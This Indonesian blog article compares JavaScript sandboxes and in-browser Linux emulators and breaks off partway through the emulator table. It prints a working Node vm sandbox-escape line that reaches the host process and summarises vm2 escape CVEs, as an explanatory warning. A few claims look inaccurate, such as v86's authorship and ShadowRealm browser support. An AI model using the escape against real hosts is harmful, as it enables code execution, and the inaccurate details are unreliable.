---
title: Perbandingan solusi JavaScript untuk simulasi kernel Linux
description: Analisis mendalam tentang rekonstitusi lingkungan Linux
  dalam JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "iHvYJAVNVmJtV5x/GzPnhzuvbPqvX43HWBhfg0WHfbE78Ao4Ntc8LfXayJzpT2SuF1EF9j5YdF1YqdW896NBYg=="
---

# Setiap sandbox JavaScript, emulator, simulator, dan honeypot Linux -- dibandingkan

Oke, jadi sudah lama saya terlalu jauh masuk ke lubang kelinci ini. Semuanya dimulai karena saya membantu di [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- proyek Fortune (saya kembali ke sana sebentar lagi) -- dan saya terus ditanya "tunggu, apa bedanya dengan `v86` ?" atau "kenapa tidak memakai `vm2` ?" -- dan saya sadar tidak bisa memberikan jawaban jelas tanpa memetakan seluruh ekosistem dulu. Jadi ya, inilah kita rupanya.

Ternyata ada empat keluarga berbeda -- sandbox JS, emulator Linux, simulator Linux, dan honeypot -- dan mereka nyaris tidak pernah tumpang tindih, meski terus-menerus disebut dalam kalimat yang sama. Seseorang yang membangun sistem plugin memakai `isolated-vm`. Seseorang yang membuat demo alat CLI memakai `v86`. Seseorang yang melakukan intelijen ancaman SSH memakai Cowrie. Mereka memecahkan masalah yang sama sekali berbeda di bawah payung samar "menjalankan kode di dalam kotak."

Saya menghabiskan banyak waktu membaca kode sumber, laporan CVE, dok arsitektur, dan halaman npm untuk menulis artikel ini. Ini akan panjang -- ambil kopi, serius. Atau dua.

> Disclaimer kecil : `typescript-virtual-container` ditonjolkan dalam artikel ini karena itulah yang memicu riset ini. Saya mencoba adil terhadap yang lainnya, tapi ingat konteks itu.

---

## Bagian 0 -- Pertama, masalah apa yang sebenarnya kamu selesaikan?

Sebelum menyelam, ada baiknya tepat soal kegunaan tiap keluarga, karena terminologinya cepat berantakan dan orang terus mencampuradukkan semuanya (saya termasuk, sebelum saya duduk dan memetakannya bersih-bersih).

**Sandbox JS** mengisolasi kode JavaScript dari proses Node.js host. Model ancamannya adalah : kode JS tak tepercaya yang bisa memanggil `process.exit()`, membaca berkas, atau meluncurkan proses anak. Solusinya adalah perbatasan di sekitar eksekusi V8. Alat ini tidak punya gagasan tentang shell Linux, sistem berkas dengan izin, atau SSH.

**Emulator Linux** menjalankan kernel Linux sungguhan yang tidak dimodifikasi dalam emulator CPU (x86, RISC-V, OR1K) yang diimplementasikan dalam JavaScript atau WebAssembly. Kamu memboot OS sungguhan. Kamu punya panggilan sistem sungguhan. Kamu punya kompatibilitas biner dengan program yang dikompilasi untuk x86. Biaya sumber dayanya sangat besar.

**Simulator Linux** meniru *perilaku* sistem Linux tanpa menjalankan kernel sungguhan. Mereka mengimplementasikan interpreter shell, sistem berkas virtual, dan cukup semantik Unix untuk mengelabui program dan manusia. Tanpa kernel, tanpa Wasm, tanpa emulasi CPU. Jauh lebih sedikit sumber daya.

**Honeypot** dirancang untuk menarik penyerang dan mencatat apa yang mereka lakukan. Ini terutama bukan lingkungan eksekusi -- melainkan alat observabilitas. Kesetiaan pada perilaku Linux yang nyata hanya penting sejauh ia mencegah penyerang mendeteksi jebakan.

Dengan kerangka ini, inilah posisi tiap proyek dalam artikel ini :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulator Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulator Linux : typescript-virtual-container (satu-satunya di ruang ini)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (bukan isolator, tapi terkait)
```

---

## Bagian 1 -- Sandbox JavaScript

### 1.1 `vm` -- modul native Node.js (bukan seperti yang kamu kira)

Jawaban tertua untuk "mengeksekusi JS tak tepercaya" di Node adalah modul native `vm`. Ia ada sejak v0.1, jadi banyak orang memakainya duluan -- dan terbakar.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Apa yang benar-benar dilakukan `vm` : ia membuat konteks V8 baru (himpunan konstruktor native baru -- `Object`, `Array`, `Function`, dll.) dan mengeksekusi kode di dalamnya, dengan referensi bersama ke apa yang kamu taruh di `sandbox`. Mesin V8-mu tidak berubah. Prosesmu tidak berubah. Memorinya dibagi.

Alasan `vm` tidak menawarkan keamanan apa pun : rantai prototipe JavaScript adalah DAG yang menghubungkan segalanya ke `Object.prototype`. Kalau kamu menaruh objek dunia host ke sandbox, tamu bisa menaiki rantai prototipenya dan mencapai konstruktor host. Dari `Function`, kamu bisa memanggil `Function("return process")()` dan mendapatkan `process` yang asli. Game over. Seperti, seketika.

```js
// Ini bekerja sempurna di vm -- kamu mendapatkan process yang asli
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Maksud saya, dokumentasi Node.js sendiri bilang : "Modul vm bukan mekanisme keamanan. Jangan pakai untuk mengeksekusi kode tak tepercaya." Peringatan ini ada sejak dulu. Orang terus mengabaikannya. Saya melihat aplikasi produksi memakai `vm` sebagai sandbox. Tolong, jangan lakukan itu.

**Vonis** : mekanisme cakupan, bukan sandbox. Pakai ketika kamu perlu mengisolasi variabel (mesin template, fitur ala `eval` di mana kamu mengendalikan kode). Jangan pernah untuk masukan tak tepercaya.

**Memori** : overhead bisa diabaikan -- heap V8 yang sama dengan proses host.
**Keamanan** : tidak ada melawan penyerang yang termotivasi.

---

### 1.2 `vm2` -- upaya komunitas, dan kematiannya yang sangat panjang

`vm2` adalah jawaban komunitas atas masalah escape `vm`. Ide sentralnya : membungkus setiap objek yang melintasi perbatasan sandbox dalam `Proxy` yang mencegat akses properti, memblokir pendakian prototipe, dan menyaring referensi berbahaya. Ide cerdas secara teori! Dalam praktik, hasilnya terbukti jauh kurang meyakinkan, seperti akan kita lihat.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // melempar VMError, process tak bisa diakses
```

Selama beberapa tahun, itu bekerja cukup baik. Tapi permukaan serangan `Proxy` JavaScript sangat besar. Setiap fitur baru bahasa JS -- generator, iterator async, `Symbol.toPrimitive`, `Error.prepareStackTrace`, slot internal `Promise` -- adalah vektor bypass potensial.

Kronologi CVE-nya adalah... sesuatu. Maksudnya, lihat ini :

| Tanggal | CVE | Mekanisme |
|------|-----|-----------|
| Okt 2022 | CVE-2022-36067 | Escape konteks host lewat `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Kebocoran objek host lewat error async tak tertangani |
| Apr 2023 | CVE-2023-29199 | Bypass sanitasi exception lewat `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mei 2023 | CVE-2023-32314 | `Proxy` pada `Error.name` → `Function` → RCE |
| Jun 2023 | CVE-2023-37466 | Fungsi async + stack overflow + `Proxy.getPrototypeOf` |
| Jun 2023 | CVE-2023-37903 | Worker thread + escape lewat eval |

Tiga CVE kritis di bulan yang sama (April 2023). TIGA. DALAM SATU BULAN. Setelah CVE-2023-37903, maintainer resmi mendepresiasi pustaka dengan pesan : *"Pustaka mengandung masalah keamanan kritis dan tidak boleh dipakai di produksi."*

Maintainer menghidupkannya lagi pada Oktober 2025 dengan versi 3.10.0, mengklaim telah memperbaiki semua yang diketahui waktu itu. Escape kritis baru (CVE-2026-22709, CVSS 9.8) diungkap Januari 2026, diikuti setumpuk sebelas lainnya pada Mei 2026. Sebelas. Polanya tidak berubah dan sejujurnya saya rasa tidak akan pernah berubah.

Masalah dasarnya bersifat arsitektural -- dan inilah pelajaran yang butuh waktu bagi seluruh ekosistem untuk mempelajarinya. Kamu tidak bisa membangun sandbox aman memakai bahasa yang sama yang kamu isolasi, di mesin yang sama, dalam proses yang sama. Permukaan escape adalah seluruh implementasi V8 -- dan V8 terdiri dari jutaan baris C++ yang terus berubah. Setiap fitur JS baru berpotensi membuka jalur serangan baru.

**Vonis** : Jangan pakai untuk aplikasi yang sensitif keamanan. Bahkan pada versi terbaru, bypass baru ditemukan setiap beberapa bulan. Maintainernya sendiri mengakuinya terbuka.

---

### 1.3 `isolated-vm` -- yang benar-benar berhasil

`isolated-vm` mengambil pendekatan yang benar : memakai primitif isolasi native V8, Isolate. Setiap Isolate V8 punya heap sendiri, garbage collector sendiri, himpunan native sendiri, dan nol referensi bersama dengan Isolate lain.

Ini perbatasan yang sama yang dipakai Chrome antar tab. Ini penghalang keamanan sungguhan, bukan trik bahasa yang dibangun di atas Proxy.

```js
import ivm from "isolated-vm";

// Setiap isolate adalah heap V8 sendiri
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // batas dalam MB
const context = await isolate.createContext();
const jail = context.global;

// Melewatkan data melintasi perbatasan membutuhkan serialisasi eksplisit
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Tidak bisa mencapai proses host, heap host atau modul host
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Kamu bisa mengakhirinya brutal saat timeout atau batas memori
isolate.dispose(); // membebaskan seluruh heap
```

Tipe `Reference` dan `ExternalCopy` adalah jembatan komunikasi eksplisit. `Reference` memberi isolate handle yang bisa dipanggil ke fungsi host -- isolate bisa memanggilnya tapi tidak bisa memeriksa closure atau prototipenya. `ExternalCopy` menyerilakan nilai (clone terstruktur) melintasi perbatasan heap. Model jembatan eksplisit ini tidak praktis, tapi itulah yang membuat isolasi nyata.

Kamu bisa menetapkan batas sumber daya ketat : memori (isolate diakhiri kalau melampaui batas), timeout jam dinding, dan timeout CPU. Pengakhiran itu nyata -- ia membunuh seluruh Isolate V8, bukan sekadar timeout JS yang bisa diakali dengan `while(true)`.

**Batasan** : ini JS saja. Kamu tidak bisa mengeksekusi bash di dalamnya. Tidak ada gagasan berkas, izin, jaringan, atau proses. Ini tepat alat yang benar untuk JS yang disubmit pengguna (plugin, formula, hook skrip), dan alat yang salah untuk sisanya. Penulis `typescript-virtual-container` menyebut ia mempertimbangkannya di awal sebelum menyadari bahwa "mengeksekusi perintah shell" dan "mengisolasi JavaScript" adalah masalah yang secara fundamental berbeda.

**Memori** : ~3-10 MB per isolate kosong, bertambah dengan pemakaian heap.
**Keamanan** : kokoh. Perbatasan V8 Isolate adalah primitif isolasi sungguhan.
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- mesin JS terpisah yang dikompilasi ke Wasm

Pendekatan berbeda : alih-alih mengisolasi di V8, menjalankan mesin JavaScript yang sama sekali terpisah yang dikompilasi ke WebAssembly. Host berjalan di V8/Node. Tamu berjalan di QuickJS-dalam-Wasm. Sandbox Wasm menyediakan perbatasan isolasi.

QuickJS masih karya Fabrice Bellard (orang yang sama di balik QEMU, FFmpeg, JSLinux, TinyEMU -- orang ini tidak nyata, serius, bagaimana satu orang melakukan semua itu?). Ini mesin JS kecil yang patuh standar ES2023 yang ditulis dalam C, dan dikompilasi ke Wasm hanya sekitar 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Berjalan di QuickJS, sepenuhnya terpisah dari V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS adalah mesin JavaScript kecil yang patuh ES2023 yang ditulis dalam C. Dikompilasi ke Wasm, ia sekitar 500 KB untuk varian sinkron, ~1 MB untuk varian asinkron (Asyncify). Manajemen memorinya manual -- setiap nilai yang kamu ekstrak dari VM harus dibebaskan eksplisit, yang agak menyebalkan tapi mencegah kejutan GC antar-perbatasan. Kompromi yang lucu!

Wrapper `@sebastianwessel/quickjs` menambahkan API yang lebih ergonomis di atasnya, dengan sistem berkas virtual opsional, dukungan fetch, dan stub modul Node.js :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Model keamanannya berbeda dari `isolated-vm` : model memori linear Wasm membuat tamu tidak bisa mengakses langsung objek heap V8. Permukaan serangan adalah antarmuka host↔Wasm (import/ekspor), bukan seluruh bahasa JS. Ini umumnya dianggap lebih tangguh daripada sandbox berbasis Proxy.

Sebaliknya : QuickJS tidak punya tingkat optimasi yang sama seperti V8. Untuk beban CPU-bound dalam JS, ia 5 hingga 20 kali lebih lambat dari V8. Untuk potongan kode kecil dan evaluasi tak tepercaya, itu umumnya tidak penting.

**Memori** : ~500 KB modul Wasm + heap per instans.
**Keamanan** : perbatasan Wasm, dianggap lebih kokoh daripada pendekatan berbasis Proxy.
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- runtime yang mengutamakan izin

Deno mengambil filosofi yang sama sekali berbeda : alih-alih membuat sandbox di Node, membangun runtime baru yang aman secara bawaan. Saya benar-benar suka pendekatan ini -- inilah yang seharusnya menjadi Node.js sejak awal, sejujurnya. Ryan Dahl (kreator asli Node.js) secara harfiah menciptakan Deno karena ia menyesali keputusan desain Node.js tertentu, yang cukup gila kalau dipikir.

Setiap kapabilitas sensitif (baca berkas, tulis berkas, jaringan, environment, subproses) membutuhkan flag `--allow-*` eksplisit :

```bash
# Yang ini hanya bisa membaca di /data, tidak yang lain
deno run --allow-read=/data script.ts

# Yang ini hanya bisa mengakses satu domain
deno run --allow-net=api.example.com script.ts

# Tanpa flag = tanpa izin
deno run untrusted.ts # tidak bisa baca, tulis, jaringan, meluncurkan
```

Model izin diimplementasikan di tingkat Rust/OS -- ini bukan trik JS. Ketika kode Deno memanggil `Deno.readFile()`, itu melewati operasi Rust yang memeriksa tabel izin sebelum menyentuh sistem berkas. Kamu tidak bisa mengakali dari JS karena panggilan sistem tidak pernah terjadi kalau izin tidak diberikan.

Untuk mengeksekusi kode yang benar-benar tak tepercaya, Worker Deno (Web Worker) menyediakan isolate kedua dalam proses yang sama, masing-masing dengan himpunan izinnya sendiri. Kamu bisa meluncurkan worker dengan nol izin dan berkomunikasi dengannya lewat `postMessage`.

Deno 2 (keluar Oktober 2024) menambahkan kompatibilitas npm lengkap dan shim kompatibilitas Node.js, yang sangat meningkatkan adopsinya untuk kasus pemakaian sisi server.

**Kompromi** : model keamanan Deno sangat bagus untuk kode yang mungkin kamu percayai sebagian. Untuk kode yang sepenuhnya tak tepercaya yang bisa adversarial, model izin tidak membantu -- kamu butuh perbatasan Isolate (`isolated-vm`) atau mesin berbeda (`quickjs-emscripten`), karena Deno tetap memakai V8 dan penyerang canggih bisa menemukan bug di tingkat V8.

---

### 1.6 TC39 ShadowRealm -- jawaban terstandarisasi (suatu hari)

Badan standardisasi JavaScript (TC39) punya proposal bernama ShadowRealm yang mencoba menstandarisasi apa yang coba dilakukan `vm` dan `vm2`, tapi dengan model keamanan yang benar. ShadowRealm membuat konteks eksekusi JS terisolasi dengan intrinsiknya sendiri, tanpa akses ke realm luar, dan antarmuka import/ekspor yang dikendalikan cermat.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrinsik terpisah, tanpa akses ke realm luar
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm tersedia di peramban (Chrome 90+, Firefox 105+) tapi belum ada di Node.js stabil pada 2026. Proposal TC39 Compartments dibangun di atasnya untuk isolasi tingkat modul. Ini jawaban terstandarisasi jangka panjang, tapi belum siap untuk produksi sisi server Node. Ini salah satu pekerjaan yang kamu lihat datang dari jauh tapi... memang belum ada. Klasik TC39.

---

### Ringkasan keluarga sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Perbatasan isolasi** | tidak ada (cakupan) | Proxy (rusak) | V8 Isolate | Wasm | V8 Isolate + izin Rust |
| **Batas memori** | ❌ | ❌ | ✅ batas ketat | ✅ heap Wasm | sebagian |
| **Timeout CPU** | ❌ | ✅ (bisa diakali) | ✅ ketat | ✅ | ✅ |
| **Keamanan** | tidak ada | rusak | kokoh | kokoh | kokoh |
| **Kecepatan JS** | V8 native | V8 native | V8 native | ~10x lebih lambat | V8 native |
| **Peramban** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Kompatibilitas Node** | native | ✅ | ✅ | shim sebagian | sebagian |
| **Status** | stabil | berisiko (CVE baru) | ✅ aktif | ✅ aktif | ✅ aktif |
| **Overhead RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Vonisnya : kalau keamanan penting buatmu, ada tepat dua opsi nyata -- `isolated-vm` (ekstensi native, V8 Isolate, kecepatan JS penuh) dan `quickjs-emscripten` (Wasm, kompatibel peramban, ~10x lebih lambat untuk komputasi intensif). Sisanya entah "tolong jangan lakukan itu" (`vm`, `vm2`) atau runtime yang memecahkan masalah yang sama sekali berbeda (Deno). ShadowRealm bisa mengubah keadaan suatu hari, tapi belum terjadi.

---

## Bagian 2 -- Emulator Linux dalam JavaScript

Di sinilah hal-hal menjadi benar-benar menarik buat saya. Ini *emulator* sungguhan -- mereka mengimplementasikan set instruksi CPU dalam JavaScript atau WebAssembly, memboot image kernel Linux sungguhan, dan mengeksekusi biner userspace sungguhan. Isolasinya berasal dari fakta tamu dan host tidak berbagi apa pun : ruang memori berbeda, aliran instruksi berbeda.

Harga yang dibayar sangat besar, tapi yang kamu dapat benar-benar luar biasa : Linux sungguhan, yang benar-benar berjalan, di peramban atau proses Node-mu. Maksudnya, cukup gila kalau dipikir, kan?

### 2.1 `v86` -- emulator PC x86 dalam JS + JIT Wasm

`v86` oleh Fabrice (copy di GitHub) adalah emulator x86 open-source paling mumpuni dalam JavaScript. Ia dimulai sebagai interpreter JS murni sekitar 2013 dan berkembang menjadi sistem JIT di mana blok dasar x86 diterjemahkan ke WebAssembly langsung, meningkatkan performa secara signifikan.

Apa yang diemulasinya :
- **CPU** : x86-32 (IA-32), set instruksi kira-kira setingkat Pentium 1. 64-bit (x86-64) tetap dikecualikan -- ini batas arsitektural perangkat keras, bukan fitur yang hilang.
- **FPU** : lewat `Float64Array` JavaScript. x87 berpresisi extended 80-bit ; double JS 64-bit. Artinya hasil floating point bisa sedikit berbeda dari CPU sungguhan.
- **Memori** : bisa dikonfigurasi, dipetakan ke `SharedArrayBuffer` atau `ArrayBuffer` dalam heap JS.
- **Perangkat keras** : 8254 PIT (timer), 8259 PIC (pengendali interupsi), pengendali keyboard 8042 (PS/2), CMOS RTC, VGA dengan ekstensi SVGA dan Bochs VBE, pengendali IDE, pengendali disket (8272A), kartu jaringan NE2000.
- **BIOS** : memakai SeaBIOS (BIOS x86 open-source).

JIT bekerja dengan mengidentifikasi blok dasar (urutan instruksi x86 tanpa lompatan), menerjemahkannya menjadi fungsi WebAssembly, meng cache fungsi itu, dan memanggilnya pada eksekusi berikutnya dari blok yang sama. Jalur kode panas mendapatkan performa Wasm native. Jalur dingin jatuh kembali ke interpreter JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Menangkap keluaran serial (konsol kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Mengirim masukan ke tamu (mengetik di shell)
emulator.serial0_send("ls /\n");
```

**OS yang didukung** : Alpine Linux (sangat baik), Ubuntu 16.04/18.04 (hanya i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (dengan catatan), MS-DOS.

**Waktu boot** : 15-40 detik untuk Alpine Linux dari image bersih. Ini inheren pada inisialisasi kernel nyata -- kamu tidak bisa melewatinya. Ya, penggunamu akan menonton kernel Linux memboot di peramban mereka. Itulah dealnya.

**Memori minimum** : 100-256 MB per instans. Cache kode Wasm JIT saja bisa mencapai puluhan MB untuk instans Linux yang sibuk.

**Pemakaian di Node.js** : didukung penuh. DOM tetap tidak perlu -- keluaran VGA bisa diabaikan kalau kamu hanya peduli keluaran serial.

**Yang tidak bisa kamu lakukan** : mengeksekusi biner 64-bit, memakai fitur kernel modern (eBPF, io_uring, dll.), atau menjalankan lebih dari segenggam instans bersamaan tanpa mencapai batas memori.

**npm** : [v86](https://www.npmjs.com/package/v86) -- diperbarui terus, publikasi terakhir hari yang sama saat saya menulis.
**GitHub** : [copy/v86](https://github.com/copy/v86)
**Demo** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux dan TinyEMU -- karya Bellard, dalam dua kali

JSLinux adalah emulator Linux dalam JavaScript milik Fabrice Bellard sendiri -- yang pertama, diterbitkan 2011. Saya terus menyebut Bellard dalam artikel ini karena ia terus muncul lagi : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Orang ini sesuatu yang lain. Benar-benar salah satu kontribusi teknis individual paling mengesankan dalam sejarah perangkat lunak, tanpa berlebihan.

JSLinux asli adalah interpreter x86 JS murni. Pada 2016, Bellard menulis TinyEMU (emulator RISC-V dalam C), mengompilasinya ke JavaScript lewat Emscripten, dan itu menjadi dasar JSLinux saat ini. Jadi JSLinux saat ini sebenarnya kode C yang membangkitkan JavaScript -- bukan JS yang ditulis tangan sama sekali.

Catatan teknis di situs Bellard layak dibaca : JSLinux saat ini menjalankan CPU RISC-V 32 atau 64-bit (bukan x86), mengemulasi konsol VirtIO, jaringan VirtIO, perangkat blok VirtIO, dan sistem berkas 9P untuk berbagi berkas dengan host. Demo JS dikompilasi dari C memakai Emscripten -- ini bukan JS yang ditulis tangan.

TinyEMU sendiri mendukung :
- RISC-V RV32IMAFDQC dan RV64IMAFDQC (32 dan 64-bit, dengan floating point, perkalian, instruksi terkompresi)
- x86 lewat KVM (hanya native, bukan emulasi -- jadi versi JS hanya RISC-V)
- Konsol VirtIO, jaringan, blok, masukan, sistem berkas 9P

TinyEMU punya demo JavaScript yang disediakan lewat Emscripten. Ini dasar JSLinux dan juga dipakai oleh `container2wasm` (lihat bagian 2.5).

**Status JSLinux** : tanpa paket npm, tanpa API yang bisa diprogram. Ini demo yang kamu buka di perambanmu. Pentingnya historis besar -- ia membuktikan konsepnya. Kegunaan praktis sebagai pustaka : nol.

**TinyEMU** : tidak di npm, sumber C tersedia di [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- emulator OR1K

jor1k adalah emulator OpenRISC 1000 (OR1K) yang ditulis dalam JavaScript oleh Sebastian Macke. Ini menarik secara historis karena jor1k memperkenalkan dukungan sistem berkas VirtIO 9P, yang kemudian diintegrasikan Bellard ke TinyEMU dan JSLinux. Penyerbukan silang antara proyek ini erat -- mereka semua saling meminjam ide, yang sejujurnya salah satu hal paling keren dari kerja emulasi open-source.

**Status** : tidak lagi dipelihara aktif, tanpa paket npm. Diarsipkan pada tahap ini. Berguna diketahui terutama untuk konteks historis -- misalnya kalau seseorang menyebut jor1k dalam percakapan, sekarang kamu tahu apa itu :)

---

### 2.4 CheerpX -- emulator x86 komersial untuk peramban

CheerpX oleh Leaning Technologies adalah emulator Linux x86 komersial berkualitas produksi. Ia tidak open-source, tapi jelas lebih mumpuni daripada v86 untuk menjalankan userspace Debian/Ubuntu sungguhan. Kalau kamu butuh VSCode sungguhan di peramban, inilah yang kamu butuhkan.

Perbedaan kunci dengan v86 :
- Mendukung ISA lebih luas (lebih banyak ekstensi x86, kompatibilitas glibc lebih baik)
- Sistem berkas berbasis IndexedDB di peramban (persisten antar pemuatan ulang halaman)
- Dukungan pthread lewat `SharedArrayBuffer` (yang membutuhkan header COOP/COEP -- ya header keamanan yang menyebalkan itu)
- Dirancang untuk menjalankan VSCode, Python, Node.js, dan aplikasi nyata lain -- bukan sekadar image OS minimal
- Dukungan profesional dan SLA tersedia (alias kamu bisa memarahi seseorang kalau rusak)

Kasus pemakaian tipikal adalah "menjalankan aplikasi Linux sungguhan di peramban tanpa server." Perusahaan memakainya untuk IDE berbasis peramban, tutorial coding, dan dokumentasi interaktif.

```js
// API CheerpX (disederhanakan)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Riwayat dengan Node.js** : CheerpX terutama dirancang untuk peramban. Emulator di bawahnya secara teori bisa berfungsi di Node (ini Wasm), tapi API dan dokumentasinya sepenuhnya berorientasi pemakaian peramban. Pemakaian sisi server tidak didukung.

**Memori** : mirip v86 -- 200+ MB untuk instans Debian sungguhan.
**Harga** : gratis untuk proyek open-source, lisensi komersial untuk SaaS produksi.
**Dok** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js dalam Wasm, bukan emulasi Linux

WebContainers sering dimasukkan ke keranjang yang sama dengan emulator Linux tapi secara arsitektur berbeda. Mereka tidak mengemulasi x86. Mereka tidak memboot Linux. Mereka menjalankan Node.js yang dikompilasi ke WebAssembly memakai WASI. Perbedaan ini sangat penting dan saya menghabiskan terlalu banyak waktu bingung soal ini.

Saya rasa kebingungan berasal dari pemasaran -- "menjalankan Node.js di perambanmu" terdengar seperti emulasi, tapi sebenarnya Node.js sendiri dikompilasi ke Wasm, bukan emulasi Linux yang menjalankan Node.js dalam VM. Dua arsitektur yang sama sekali berbeda.

Arsitekturnya :
1. Node.js dikompilasi ke Wasm (runtime WASI kustom secara spesifik)
2. Service Worker mencegat permintaan jaringan server Node.js yang diemulasi dan merutekannya ke tab peramban
3. Sistem berkas hidup di memori peramban (tanpa I/O disk)
4. npm adalah implementasi kustom yang dioptimalkan untuk pemakaian di peramban

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Menulis berkas
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Menjalankan perintah Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Karena ini menjalankan Node.js sungguhan (dikompilasi ke Wasm), kamu punya npm sungguhan, API Node.js sungguhan, dan resolusi modul sungguhan. Kamu tidak punya userspace Linux generalis -- kamu tidak bisa menginstal paket sistem dengan `apt`, mengeksekusi biner terkompilasi sembarang, atau melakukan banyak hal di luar ekosistem Node.js.

**Prasyarat peramban** : SharedArrayBuffer (membutuhkan header COOP/COEP), dukungan Service Worker, Wasm modern.

**Riwayat dengan Node.js** : dirancang eksklusif untuk pemakaian peramban. API tidak berfungsi di luar konteks peramban.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Dok** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- kontainer Docker yang dikompilasi ke Wasm

`container2wasm` adalah alat (bukan paket npm) dari NTT yang mengambil image kontainer Docker dan mengubahnya menjadi biner WebAssembly yang bisa berjalan di host Wasm mana pun -- termasuk peramban. Ketika saya melihat ini pertama kali, saya benar-benar tidak percaya itu berhasil.

Mekanismenya :
- Untuk kontainer x86_64 : menanamkan Bochs (emulator x86, dikompilasi ke Wasm) + sistem berkas root kontainer
- Untuk kontainer riscv64 : menanamkan TinyEMU (Bellard lagi!) + sistem berkas root kontainer
- Berkas `.wasm` hasilnya memboot emulator, me mounting sistem berkas kontainer, dan mengeksekusi entrypoint kontainer

```bash
# Mengonversi kontainer Ubuntu 22.04 ke Wasm
c2w ubuntu:22.04 out.wasm

# Menjalankannya
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Atau menyajikannya untuk pemakaian peramban
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

`.wasm` hasilnya besar -- Ubuntu minimal beberapa ratus MB -- tapi sepenuhnya mandiri. Kamu bisa mengirim `.wasm` lewat email ke seseorang dan ia bisa menjalankan Ubuntu di perambannya. Kalimat ini seharusnya tidak masuk akal tapi inilah kita.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Ringkasan keluarga emulator

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Arsitektur** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietari) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel sungguhan** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Paket npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (alat CLI) |
